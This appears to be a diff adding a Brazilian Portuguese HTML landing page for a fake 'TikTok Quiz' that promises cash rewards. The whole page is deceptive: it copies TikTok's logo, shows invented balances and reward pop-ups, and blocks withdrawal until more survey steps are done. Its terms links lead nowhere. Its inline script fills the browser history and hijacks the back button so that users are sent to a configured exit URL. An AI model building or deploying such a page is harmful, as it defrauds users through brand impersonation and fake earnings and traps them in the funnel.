@@ -1,0 +1,136 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>TikTok Quiz — Responda e ganhe até R$ 559,51</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+
+  <!-- Estilos do projeto -->
+  <link rel="stylesheet" href="css/style.css">
+
+  <!--
+    ╔═══════════════════════════════════════════════════════════╗
+    ║  TRACKING (opcional) — cole aqui seu GTM ou GA4           ║
+    ╚═══════════════════════════════════════════════════════════╝
+  -->
+
+  <!-- Utmify (preserva parâmetros UTM) -->
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+</head>
+
+<body>
+
+  <!-- ── CONFETTI ───────────────────────────────────────────── -->
+  <div id="confetti-container"></div>
+
+  <!-- ── APP ────────────────────────────────────────────────── -->
+  <div class="app-container">
+
+    <!-- HEADER: logo + saldo + sacar -->
+    <div class="app-header">
+      <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 0 0-.79-.05 6.34 6.34 0 0 0-6.34 6.34 6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.33-6.34V8.69a8.18 8.18 0 0 0 4.78 1.52V6.75a4.85 4.85 0 0 1-1.01-.06z" fill="#111"></path>
+        </svg>
+        <span class="brand-name">TikTok</span>
+      </div>
+      <div class="header-right">
+        <div class="balance-pill">R$<span id="current-balance">0</span></div>
+        <button class="sacar-btn" id="withdraw-btn">SACAR</button>
+      </div>
+    </div>
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-container">
+      <div id="progress-bar"></div>
+    </div>
+
+    <!-- QUIZ -->
+    <div id="quiz-container"></div>
+
+    <!-- TERMS FOOTER (fixo na página do quiz) -->
+    <div class="quiz-terms">
+      Ao participar das atividades de recompensa, você concorda com nossos
+      <a href="#">Termos</a> e <a href="#">Condições</a>.
+    </div>
+
+  </div><!-- /.app-container -->
+
+  <!-- ── MODAL: AVISO SAQUE BLOQUEADO ───────────────────────── -->
+  <div class="modal-overlay" id="withdraw-warning-modal">
+    <div class="modal-box warning-modal-box">
+      <div class="warning-header">
+        <span class="warning-title">Atenção</span>
+        <button class="warning-close-btn" id="warning-close-btn">✕</button>
+      </div>
+      <div class="warning-body">
+        <p>Não é possível realizar o saque do valor ainda. É necessário prosseguir com a pesquisa.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── MODAL: RECOMPENSA POR PERGUNTA ──────────────────────── -->
+  <div class="modal-overlay" id="reward-modal" role="dialog" aria-modal="true">
+    <div class="modal-box">
+      <div class="reward-nova-title">Nova recompensa</div>
+      <div class="reward-voce-ganhou">Você ganhou</div>
+      <div class="reward-amount" id="reward-value">0.00</div>
+      <div class="reward-subtitle">Responda mais pesquisas<br>para ganhar até R$850</div>
+      <button class="continue-reward-btn" id="continue-reward-btn">
+        <span class="coin-icon">🪙</span> Continuar recebendo
+      </button>
+    </div>
+  </div>
+
+  <!-- ── MODAL: RECOMPENSA FINAL ─────────────────────────────── -->
+  <div class="modal-overlay final-modal" id="final-modal" role="dialog" aria-modal="true" aria-labelledby="final-title-text">
+    <div class="modal-box">
+      <div class="final-content">
+        <div class="reward-icon">🎉</div>
+        <div class="final-title" id="final-title-text">Parabéns! Você completou o quiz!</div>
+        <div class="final-subtitle">Seu saldo total acumulado é:</div>
+        <div class="reward-amount" id="total-reward">0.00</div>
+        <button class="withdraw-submit-btn" id="restart-btn">Sacar agora</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── SCRIPTS (ordem importa) ────────────────────────────── -->
+  <!--
+    config.js DEVE vir primeiro — contém EXIT_URL e OFFER_URL
+    que são usados pelos demais scripts.
+  -->
+  <script src="js/config.js"></script>
+  <script src="js/utils.js"></script>
+  <script src="js/confetti.js"></script>
+  <script src="js/rewards.js"></script>
+  <script src="js/quiz.js"></script>
+  <script src="js/pages.js"></script>
+
+  <!-- Inicialização -->
+  <script>
+    // Exit intent — redireciona ao botão voltar
+    (function () {
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      window.addEventListener('popstate', function () {
+        setTimeout(function () {
+          window.location.replace(CONFIG.EXIT_URL);
+        }, 1);
+      });
+    })();
+
+    // Inicia o quiz ao carregar
+    document.addEventListener('DOMContentLoaded', function () {
+      renderQuestion(0);
+      initializePages();
+    });
+  </script>
+
+
+
+</body></html>
